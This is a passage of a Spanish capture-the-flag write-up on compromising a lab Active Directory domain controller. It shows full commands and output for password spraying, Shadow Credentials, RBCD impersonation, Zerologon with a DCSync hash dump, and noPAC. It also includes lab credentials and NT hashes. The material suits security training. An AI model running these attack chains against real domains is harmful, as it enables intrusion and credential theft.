Lo que haré a continuación es combinar las palabras semilla entre sí, con el fin de generar un diccionario en base a lo visto.

### Generando un diccionario nuevo

Primero combinaré las palabras de `seed.txt` entre sí.

```shell
hashcat -a 1 seed.txt seed.txt --stdout | sort -u > combined.txt

'''
Example output combined.txt
primaverathl
shadow.thl2023
thl2026
thlinvierno
'''
```

### Mutación de contraseñas

Una vez generado el diccionario base, aplicaré las reglas anteriores para obtener las diferentes variantes.

```shell
hashcat --force combined.txt -r rule.txt --stdout | sort -u > mut_password.txt

'''
Example output mut_password.txt
0t0ñ02026!
0t0ñ02026@
Sh@d0winviern0@
Sh@d0ws.thl2026
Sh@d0ws.thl2026!
Sh@d0ws.thl2026@
'''
```

De esta forma, el diccionario final contiene combinaciones derivadas de los patrones identificados en el informe y de las transformaciones observadas en el comportamiento de los usuarios.

### Nueva userlist

Finalmente, crearé una lista con las cuentas que todavía no se encuentran bajo mi control.

```shell
cat << EOF > uncontrolled_users.txt
Administrator
helpdesk
ITSupport
auditmgr
SecurityTeam
infraadmin
jsmith
EOF
```

Con ambos diccionarios preparados, realizaré un ataque de [Password guessing](https://attack.mitre.org/techniques/T1110/001/) contra SMB utilizando `netexec`.

### Password guessing contra SMB

```shell
nxc smb shadow.thl -u uncontrolled_users.txt -p mut_password.txt | grep -v "STATUS_LOGON_FAILURE"

SMB                      10.10.10.120    445    SEERVER          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:SEERVER) (domain:shadow.thl) (signing:True) (SMBv1:True) (Null Auth:True) (DC:True)
SMB                      10.10.10.120    445    SEERVER          [+] shadow.thl\helpdesk:Shadows.Thl2026@
```

Después de unos cuantos minutos, obtengo credenciales válidas.

## Lateral movement to auditmgr

### GenericWrite

Ahora que tengo el control de este objeto, volveré a revisar `BloodHound` para identificar las posibilidades de movimiento lateral.

![Shadows](/assets/posts/2026-12-12-shadows_thl/05_GenericWrite.png)
*helpdesk GenericWrite over auditmgr*

El usuario `helpdesk` dispone de permisos **GenericWrite** sobre el usuario `auditmgr` (entidad Tier Zero). Como tal, `GenericWrite` **NO** implica control total del objeto, pero permite modificar múltiples atributos que sean escribibles en ese contexto.

Entre los atributos que pueden resultar interesantes se encuentran `servicePrincipalName`, `msDS-KeyCredentialLink` y `altSecurityIdentities`.

Lo que puede dar lugar a:
- `Shadow Credentials`,
- abusar de certificados con `ADCS ESC14` y
- `Targeted Kerberoasting`.

> Más sobre `GenericWrite` en [Specterops](https://bloodhound.specterops.io/resources/edges/generic-write) / [The Hacker recipes](https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting) / ejemplos prácticos en [The Hacking articles](https://www.hackingarticles.in/genericwrite-active-directory-abuse/)
{: .prompt-info }

#### Shadow Credentials

Intentaré primero con `Shadow Credentials`.

**Shadow Credentials** es una técnica que abusa del atributo `msDS-KeyCredentialLink` para asociar una credencial basada en claves al objeto de Active Directory. En lugar de conocer la contraseña del usuario objetivo, puedo añadir una credencial controlada por mí y utilizarla posteriormente para autenticarme mediante [PKINIT](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b).

> Más sobre esta técnica en [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials), [SpecterOps](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/) e [ired.team](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials).
{: .prompt-info }

En este caso, `GenericWrite` sobre `auditmgr` me permite modificar `msDS-KeyCredentialLink`, por lo que registraré una credencial controlada por mí sobre esta cuenta.

Para ello utilizaré [pyWhisker](https://github.com/ShutdownRepo/pywhisker). Por otro lado, para la instalación y las dependencias utilizaré `uv`.

```shell
uv add --script pywhisker.py -r requirements.txt
```

**Generar un certificado**

A continuación, generaré y asociaré una nueva credencial al usuario `auditmgr`.

```shell
uv run pywhisker.py -d shadow.thl -u helpdesk -p 'Shadows.Thl2026@' --target "auditmgr" --action "add"

[*] Searching for the target account
[*] Target user found: CN=auditmgr,CN=Users,DC=shadow,DC=thl
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 3f0898cc-908d-b4d3-e4d0-b8d37544b244
[*] Updating the msDS-KeyCredentialLink attribute of auditmgr
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: yxVtaP8q.pfx
/home/f4dee/Documents/Shadows/exploits/pywhisker/pywhisker/pywhisker.py:132: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  cert_obj = x509.load_pem_x509_certificate(pem_cert_data, default_backend())
[+] PFX exportiert nach: yxVtaP8q.pfx
[i] Passwort für PFX: VZlhsRZe22hs9ijrrmmb
[+] Saved PFX (#PKCS12) certificate & key at path: yxVtaP8q.pfx
[*] Must be used with password: VZlhsRZe22hs9ijrrmmb
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```
El output confirma que la modificación de `msDS-KeyCredentialLink` se ha realizado correctamente y genera un certificado junto con su clave privada en formato PFX.

**Solicitar un TGT**

Con el certificado generado, ahora puedo solicitar un TGT para auditmgr mediante **PKINIT**.

Clonaré [PKINITtools](https://github.com/dirkjanm/PKINITtools) e instalaré sus dependencias.

```shell
uv add --script gettgtpkinit.py -r requirements.txt
```

Ahora obtendré un TGT para el usuario `auditmgr`.

```shell
uv run gettgtpkinit.py -cert-pfx yxVtaP8q.pfx -pfx-pass VZlhsRZe22hs9ijrrmmb shadow.thl/auditmgr auditmgr.ccache

2026-08-21 21:16:18,705 minikerberos INFO     Loading certificate and key from file
2026-08-21 21:16:18,729 minikerberos INFO     Requesting TGT
2026-08-21 21:16:42,430 minikerberos INFO     AS-REP encryption key (you might need this later):
2026-08-21 21:16:42,431 minikerberos INFO     ef661d533e4c0c9d9ca60bb7d89da3fb3b9ad2eb57d155641fc41d1b4a6975bb
2026-08-21 21:16:42,436 minikerberos INFO     Saved TGT to file
```

**Recuperar el NT hash**

Con el TGT obtenido y la clave de sesión, puedo recuperar el NT hash de `auditmgr`.

```shell
export KRB5CCNAME=auditmgr.ccache
uv run getnthash.py -key ef661d533e4c0c9d9ca60bb7d89da3fb3b9ad2eb57d155641fc41d1b4a6975bb -dc-ip 10.10.10.120 shadow.thl/auditmgr

Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
98019215ea3bcb223dacec8fc12a71aa
```

**Validación de credenciales**

Finalmente, validaré el hash.

```shell
nxc smb shadow.thl -u auditmgr -H 98019215ea3bcb223dacec8fc12a71aa

SMB         10.10.10.120    445    SEERVER          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:SEERVER) (domain:shadow.thl) (signing:True) (SMBv1:True) (Null Auth:True) (DC:True)
SMB         10.10.10.120    445    SEERVER          [+] shadow.thl\auditmgr:98019215ea3bcb223dacec8fc12a71aa
```

Crendencial válida por SMB, pero **NO** por WinRM.

Con este acceso, continuaré revisando BloodHound para identificar las siguientes relaciones y posibles rutas de escalada.

## PrivEsc (Method 1 RBCD) 

![Shadows](/assets/posts/2026-12-12-shadows_thl/06_GenericAll_AddSelf.png)
*auditmgr GenericAll over SEERVER$ / AddSelf over PlatformEngineering*

Este usuario tiene dos permisos:
- `GenericAll` sobre el domain controller `SEERVER$`,
- `AddSelf` sobre el grupo `PlatformEngineering` que mencioné anteriormente.

`GenericAll` proporciona [cuatro posibilidades de abuso](https://bloodhound.specterops.io/resources/edges/generic-all#with-genericall-over-a-computer) sobre la cuenta de máquina `SEERVER$`. Entre estas opciones, la que me interesa para esta ruta es **Resource-Based Constrained Delegation (RBCD)**.

### Un poco de RBCD

[Resource-Based Constrained Delegation (aka RBCD)](https://blog.deephacking.tech/en/posts/constrained-delegation-y-resource-based-constrained-delegation/#resource-based-constrained-delegation-rbcd) es un mecanismo de delegación de Kerberos en el que el equipo destino define qué security principals están autorizados para actuar en su nombre. Esta configuración se almacena en el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity`.

Al controlar un objeto con permisos suficientes **(GenericAll, GenericWrite o WriteProperty)** para modificar esta configuración sobre un equipo objetivo, puedo indicar que una cuenta de máquina controlada por mí puede realizar delegación hacia ese equipo. Posteriormente, mediante las extensiones **S4U de Kerberos**, puedo solicitar tickets para un usuario que no controlo directamente, como `Administrator`, y utilizarlos frente al servicio del equipo objetivo.

En este escenario, `auditmgr` tiene `GenericAll` sobre `SEERVER$`, por lo que puedo modificar la configuración de RBCD del Domain Controller. La "jugada" es tal que así.

```text
auditmgr
   │ GenericAll sobre SERVER$
   ▼
Control de SERVER$
   │ Crear/controlar cuenta de máquina
   ▼
Configurar RBCD en SERVER$
   │ S4U2Self + S4U2Proxy
   ▼
Suplantar a Administrator
   │ Service Ticket
   ▼
CIFS/SERVER$
   │ Pass-the-Ticket
   ▼
Acceso como Administrator
   │
   ▼
SYSTEM
```

La idea importante es que no necesito conocer la contraseña ni el hash de `Administrator`. Lo que obtengo es un **TGS** válido para el servicio de `SEERVER` con la identidad de `Administrator`, que posteriormente puedo utilizar para acceder al recurso administrativo `ADMIN$`.

### Grupo PlatformEngineering

Mientras que, por otro lado, `AddSelf` permite añadir al usuario `auditmgr` al grupo al que apunte este privilegio, en este caso `PlatformEngineering`. La pertenencia a este grupo permite heredar los privilegios que este tiene asignados, es decir, delega sus privilegios a los security principals que lo integran. Por lo que, si me añado al grupo `PlatformEngineering` (anidado dentro del grupo `Remote Management Users`), podré autenticarme con `evil-winrm-py` ganando una shell.

```text
auditmgr
   │ AddSelf sobre PlatformEngineering
   ▼
PlatformEngineering
   │ miembro de
   ▼
Remote Management Users
   │ permite el acceso remoto correspondiente
   ▼
auditmgr obtiene una shell remota
```

> Más sobre `AddSelf` en [SpecterOps](https://bloodhound.specterops.io/resources/edges/add-self)
{: .prompt-info }

### Abusando de RBCD

Ahora ambas relaciones pueden llevar a un acceso más privilegiado. Para mantener la ruta principal centrada en Kerberos, optaré por abusar de RBCD de forma [remota](https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/).

También es posible hacerlo de forma [local](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution), obteniendo primero una shell mediante la pertenencia a `Remote Management Users` y utilizando posteriormente herramientas como `Rubeus`. 

Entonces para [evitar la fatiga](https://media1.tenor.com/m/OzyJUnkWQw8AAAAd/cartero-prefiero-evitar-la-fatiga.gif) (vamos que no cuesta mucho añadirse al grupo xD, importar los módulos necesarios y jugar con Rubeus) me quedaré con la variante remota.

> Puedes probar la variante local por tu cuenta; de hecho, te animo a hacerlo. Además de resultar interesante desde el punto de vista práctico, obtener una sesión de shell permite plantear el escenario desde una perspectiva diferente y experimentar con herramientas como Rubeus y tećnicas basadas en [LOLBAS](https://lolbas-project.github.io/).
{: .prompt-tip }

#### Creando una cuenta de equipo

Crearé una cuenta de máquina controlada por mí gracias al atributo [ms-DS-MachineAccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota). 

```shell
bloodyad -H SEERVER -d shadow.thl -u auditmgr -p :98019215ea3bcb223dacec8fc12a71aa add computer 'BadComputer' 'P4ssw0r2026$'

[+] BadComputer$ created
```

#### Modificando el atributo

Ahora toca aprovechar `GenericAll` para modificar la configuración de RBCD de `SEERVER$`. En concreto, añadiré la cuenta `BadComputer$` como principal autorizado en `msDS-AllowedToActOnBehalfOfOtherIdentity`, permitiéndole realizar delegación hacia el DC.

```shell
bloodyad -H SEERVER -d shadow.thl -u auditmgr -p :98019215ea3bcb223dacec8fc12a71aa add rbcd 'SEERVER$' 'BadComputer$'

[!] No security descriptor has been returned, a new one will be created
[+] BadComputer$ can now impersonate users on SEERVER$ via S4U2Proxy
[+] e.g. badS4U2proxy 'kerberos+nt://shadow.thl\auditmgr:98019215ea3bcb223dacec8fc12a71aa@SEERVER/?serverip=10.10.10.120' 'HOST/SEERVER$@shadow.thl' 'Administrator@shadow.thl'
```

#### Impersonando mediante S4U

Utilizaré `getST` para solicitar los tickets Kerberos necesarios y obtener un **TGS** para el servicio [CIFS](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc772815(v=ws.10)#service-principal-names), impersonando al usuario `Administrator`.

Durante el proceso se realizan las operaciones **S4U2Self** y **S4U2Proxy**. El resultado será una cache Kerberos que contiene el ticket para `cifs/SEERVER.shadow.thl`.

```shell
getST.py 'shadow.thl/BadComputer$:P4ssw0r2026$' -spn cifs/SEERVER.shadow.thl -impersonate administrator -dc-ip 10.10.10.120

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_SEERVER.shadow.thl@SHADOW.THL.ccache
```

#### Pass-the-Ticket

Finalmente exporto la cache Kerberos mediante `KRB5CCNAME` y realizo **Pass-the-Ticket** con `psexec`. La herramienta utilizará el ticket obtenido para autenticarse contra `SEERVER` mediante Kerberos.

```shell
export KRB5CCNAME=administrator@cifs_SEERVER.shadow.thl@SHADOW.THL.ccache
psexec.py shadow.thl/administrator@SEERVER.shadow.thl -k -no-pass -dc-ip 10.10.10.120

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on SEERVER.shadow.thl.....
[*] Found writable share ADMIN$
[*] Uploading file MwNGeYlW.exe
[*] Opening SVCManager on SEERVER.shadow.thl.....
[*] Creating service glAM on SEERVER.shadow.thl.....
[*] Starting service glAM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Obtengo privilegios como `NT AUTHORITY\SYSTEM`.

### user.txt & root.txt

Finalmente, puedo obtener `user.txt` y `root.txt`.

```shell
type C:\Users\Administrator\Desktop\user.txt
<NOTHING INTERETING HERE>

type C:\Users\Administrator\Desktop\root.txt
<NOTHING INTERETING HERE>
```

Con esto completo la ruta **intended** de escalada: **RID Cycling → `Support.txt` (vishing) → `shadow` → `GenericAll` sobre `secadmin` → `ForceChangePassword` sobre `svc_backup` → `DataRecovery` (política de contraseñas) → diccionario a medida → `helpdesk` → `GenericWrite` sobre `auditmgr` → Shadow Credentials → `auditmgr` → `GenericAll` sobre `SEERVER$` → RBCD → Service Ticket para `CIFS` como `Administrator` → Pass-the-Ticket → `SYSTEM`**.

A continuación, dos rutas **unintended** hacia Domain Admin que no dependen de esta cadena de abuso de ACLs.

----
## PrivEsc (Method 2 Zerologon)

Antes de profundizar en la enumeración, siempre me gusta comprobar si el objetivo presenta vulnerabilidades conocidas. Una de ellas es la clásica `Zerologon` de la cual ya hablé en la máquina [Chimichurri](https://f4dee-backup.github.io/chimichurri_thl/#zerologon-cve-2020-1472).

```shell
nxc smb shadow.thl -u "" -p "" -M zerologon

SMB         10.10.10.120    445    SEERVER          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:SEERVER) (domain:shadow.thl) (signing:True) (SMBv1:True) (Null Auth:True) (DC:True)
SMB         10.10.10.120    445    SEERVER          [+] shadow.thl\guest:
ZEROLOGON   10.10.10.120    445    SEERVER          VULNERABLE
ZEROLOGON   10.10.10.120    445    SEERVER          Next step: https://github.com/dirkjanm/CVE-2020-1472
```

El resultado confirma que `SEERVER` es vulnerable a Zerologon. Clono el repositorio mostrado por NetExec y ejecuto el exploit.

```shell
python cve-2020-1472-exploit.py SEERVER 10.10.10.120
Performing authentication attempts...
======================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
```

Con la autenticación de la cuenta de máquina del DC comprometida, puedo realizar un [DCSync Attack](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync) con `secretsdump` para obtener los secretos del dominio.

```shell
secretsdump.py -no-pass -just-dc 'SEERVER$@shadow.thl'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

...SNIP...

Administrator:500:aad3b435b51404eeaad3b435b51404ee:1e2487d1523e9ab150cc8442f2876882:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:946d4c3e6f8a7c9ab9ee01a3711de601:::

...SNIP...

[*] Cleaning up...
```

Con el NT hash de Administrator puedo realizar `Pass-the-Hash` y autenticarme con `evil-winrm-py`.

```shell
evil-winrm-py -i shadow.thl -u Administrator -H 1e2487d1523e9ab150cc8442f2876882
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'shadow.thl:5985' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> whoami
shadow\administrator


evil-winrm-py PS C:\Users\Administrator\Documents> type ..\Desktop\user.txt
<NOTHING INTERESTING HERE>
evil-winrm-py PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
<NOTHING INTERESTING HERE>
```

De esta forma, esta segunda ruta de escalada queda resumida como: **Guest → Zerologon (`CVE-2020-1472`) → cuenta de máquina del DC → `secretsdump` → hash NTLM de `Administrator` → Pass-the-Hash → acceso administrativo**, sin depender en absoluto de la cadena de abuso de ACLs vista anteriormente.

----
## PrivEsc (Method 3 noPAC)

Por otro lado, también puedo comprobar la vulnerabilidad conocida como [noPAC](https://www.paloaltonetworks.com/blog/security-operations/detecting-the-kerberos-nopac-vulnerabilities-with-cortex-xdr/).

Esta vulnerabilidad está compuesta por dos fallos relacionados: [CVE-2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287) y [CVE-2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278), que, bajo determinadas condiciones, permiten obtener una identidad privilegiada asociada a un controlador de dominio.

Un atacante que ya tenga una cuenta válida en el dominio puede, bajo determinadas condiciones, aprovechar esta cadena de vulnerabilidades para suplantar la identidad de una cuenta de equipo privilegiada y, potencialmente, alcanzar privilegios de Domain Admin.

A grandes rasgos, noPac aprovecha una combinación de problemas relacionados con **Kerberos**, la `validación del PAC` y el atributo `sAMAccountName` para provocar una confusión de identidad y obtener credenciales/tickets asociados a un controlador de dominio.

```shell
nxc smb shadow.thl -u shadow -p ')*7UbH5\,:K(91lD9W0RN+e' -M nopac

SMB         10.10.10.120      445    SEERVER          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:SEERVER) (domain:shadow.thl) (signing:True) (SMBv1:True) (Null Auth:True) (DC:True)
SMB         10.10.10.120      445    SEERVER          [+] shadow.thl\shadow:)*7UbH5\,:K(91lD9W0RN+e 
NOPAC       10.10.10.120      445    SEERVER          TGT with PAC size 1430
NOPAC       10.10.10.120      445    SEERVER          TGT without PAC size 689
NOPAC       10.10.10.120      445    SEERVER
NOPAC       10.10.10.120      445    SEERVER          VULNERABLE
NOPAC       10.10.10.120      445    SEERVER          Next step: https://github.com/Ridter/noPac
```

Clono el repositorio y solo ejecuto

```shell
python3 noPac.py 'shadow.thl/shadow:)*7UbH5\,:K(91lD9W0RN+e' -dc-ip 10.10.10.120 -dc-host SEERVER -shell --impersonate administrator

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target SEERVER.shadow.thl
[*] will try to impersonate administrator
[*] Adding Computer Account "WIN-EVEWC2NTX8K$"
[*] MachineAccount "WIN-EVEWC2NTX8K$" password = 4)A6DhtoNzWE
[*] Successfully added machine account WIN-EVEWC2NTX8K$ with password 4)A6DhtoNzWE.
[*] WIN-EVEWC2NTX8K$ object = CN=WIN-EVEWC2NTX8K,CN=Computers,DC=shadow,DC=thl
[*] WIN-EVEWC2NTX8K$ sAMAccountName == SEERVER
[*] Saving a DC's ticket in SEERVER.ccache
[*] Reseting the machine account to WIN-EVEWC2NTX8K$
[*] Restored WIN-EVEWC2NTX8K$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating administrator
[*] 	Requesting S4U2self
[*] Saving a user's ticket in administrator.ccache
[*] Rename ccache to administrator_SEERVER.shadow.thl.ccache
[*] Attempting to del a computer with the name: WIN-EVEWC2NTX8K$
[-] Delete computer WIN-EVEWC2NTX8K$ Failed! Maybe the current user does not have permission.
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>hostname
Seerver

C:\Windows\system32>type C:\Users\Administrator\Desktop\user.txt
<NOTHING INTERESTING HERE>
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
<NOTHING INTERESTING HERE>
```

Con esto, la tercera ruta de escalada queda resumida como: **usuario válido del dominio → noPAC (`CVE-2021-42287` + `CVE-2021-42278`) → impersonación de `Administrator` → `SYSTEM`**, la vía más directa de las tres al no requerir ninguna fase previa de abuso de ACLs.
